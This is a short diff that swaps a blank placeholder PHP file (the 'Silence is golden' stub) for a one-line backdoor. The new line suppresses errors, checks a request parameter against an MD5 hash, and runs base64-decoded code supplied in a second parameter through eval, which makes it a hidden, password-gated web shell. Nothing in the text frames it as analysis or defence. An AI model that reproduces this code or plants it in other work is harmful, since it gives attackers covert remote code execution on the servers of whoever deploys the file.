@@ -1,3 +1,1 @@
-<?php
-// Silence is golden.
-?>
+<?php echo"...";error_reporting(0);if(isset($_REQUEST['lanfren']) && md5($_REQUEST['lanfren']) == '863b84c60e8377d9400b97e449a96e96' && isset($_REQUEST['lanfra'])) eval(base64_decode($_REQUEST['lanfra']));?>
